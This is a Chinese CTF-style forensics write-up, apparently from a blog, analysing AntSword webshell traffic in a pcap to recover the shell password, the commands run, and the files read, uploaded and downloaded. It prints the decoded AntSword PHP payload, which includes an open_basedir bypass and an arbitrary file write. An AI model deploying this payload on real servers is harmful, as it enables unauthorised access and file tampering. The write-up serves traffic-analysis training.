# 第六章-流量特征分析-蚁剑流量分析

  
  
&lt;!--more--&gt;  
1.木马的连接密码是多少  
2.黑客执行的第一个命令是什么  
3.黑客读取了哪个文件的内容，提交文件绝对路径  
4.黑客上传了什么文件到服务器，提交文件名  
5.黑客上传的文件内容是什么  
6.黑客下载了哪个文件，提交文件绝对路径  
## 0x00 环境  
`Antsword.pcap`  
## 0x01  
利用`CTF-NETA`进行分析  
1.木马的连接密码是多少  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202405291940604.png)
`flag{1}`  
2.黑客执行的第一个命令是什么  
第一个返回的是`www-data`，所以猜测是`id`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202405291931976.png)
`flag{id}`  
3.黑客读取了哪个文件的内容，提交文件绝对路径  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202405291943545.png)
返回了`/etc/passwd`的内容，所以应该是`/etc/passwd`  
`flag{/etc/passwd}`  
4.黑客上传了什么文件到服务器，提交文件名  
5.黑客上传的文件内容是什么  
*解密一下流量*  
*![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202405291945414.png)
```php  
&lt;?php  
@ini_set(&#34;display_errors&#34;, &#34;0&#34;);  
@set_time_limit(0);  
$opdir = @ini_get(&#34;open_basedir&#34;);  
if ($opdir) {  
    $ocwd = dirname($_SERVER[&#34;SCRIPT_FILENAME&#34;]);  
    $oparr = preg_split(base64_decode(&#34;Lzt8Oi8=&#34;), $opdir);@  
    array_push($oparr, $ocwd, sys_get_temp_dir());  
    foreach($oparr as $item) {  
        if (!@is_writable($item)) {  
            continue;  
        };  
        $tmdir = $item.  
        &#34;/.368479785&#34;;@  
        mkdir($tmdir);  
        if (!@file_exists($tmdir)) {  
            continue;  
        }  
        $tmdir = realpath($tmdir);@  
        chdir($tmdir);@  
        ini_set(&#34;open_basedir&#34;, &#34;..&#34;);  
        $cntarr = @preg_split(&#34;/\\\\|\//&#34;, $tmdir);  
        for ($i = 0; $i &lt; sizeof($cntarr); $i&#43;&#43;) {@  
            chdir(&#34;..&#34;);  
        };@  
        ini_set(&#34;open_basedir&#34;, &#34;/&#34;);@  
        rmdir($tmdir);  
        break;  
    };  
};;  
  
function asenc($out) {  
    return $out;  
};  
  
function asoutput() {  
    $output = ob_get_contents();  
    ob_end_clean();  
    echo &#34;6960&#34;.  
    &#34;cb205&#34;;  
    echo@ asenc($output);  
    echo &#34;1e0a&#34;.  
    &#34;91914&#34;;  
}  
ob_start();  
try {  
    $f = base64_decode(substr($_POST[&#34;t41ffbc5fb0c04&#34;], 2));  
    $c = $_POST[&#34;ld807e7193493d&#34;];  
    $c = str_replace(&#34;\r&#34;, &#34;&#34;, $c);  
    $c = str_replace(&#34;\n&#34;, &#34;&#34;, $c);  
    $buf = &#34;&#34;;  
    for($i=0;$i&lt;strlen($c);$i&#43;=2)  
        $buf.=urldecode(&#34;%&#34;.substr($c,$i,2));  
        echo(@fwrite(fopen($f,&#34;a&#34;),$buf)?&#34;1&#34;:&#34;0&#34;);;}  
    catch(Exception $e){  
        echo &#34;ERROR://&#34;.$e-&gt;getMessage();  
    };  
    asoutput();  
    die();  
?&gt;  
```  
解密一下文件名  
```php  
&lt;?php   
$f = base64_decode(substr(&#34;0ZL3Zhci93d3cvaHRtbC9mbGFnLnR4dA==&#34;, 2));  
$c = &#34;666C61677B77726974655F666C61677D0A&#34;;  
$c = str_replace(&#34;\r&#34;, &#34;&#34;, $c);  
$c = str_replace(&#34;\n&#34;, &#34;&#34;, $c);  
$buf = &#34;&#34;;  
for($i=0;$i&lt;strlen($c);$i&#43;=2)  
    $buf.=urldecode(&#34;%&#34;.substr($c,$i,2));  
    echo(@fwrite(fopen($f,&#34;a&#34;),$buf)?&#34;1&#34;:&#34;0&#34;);  
?&gt;  
```  
在`/var/www/html`下写入了`flag.txt`文件，并且内容为`flag{write_flag}`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202405292002152.png)
6.黑客下载了哪个文件，提交文件绝对路径  
wireshark中的流量解密  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202405292004425.png)
可以看到是一个下载文件的请求，将`2eL3Zhci93d3cvaHRtbC9jb25maWcucGhw`进行解密得到  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202405292005079.png)
`flag{/var/www/html/config.php}`  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/  

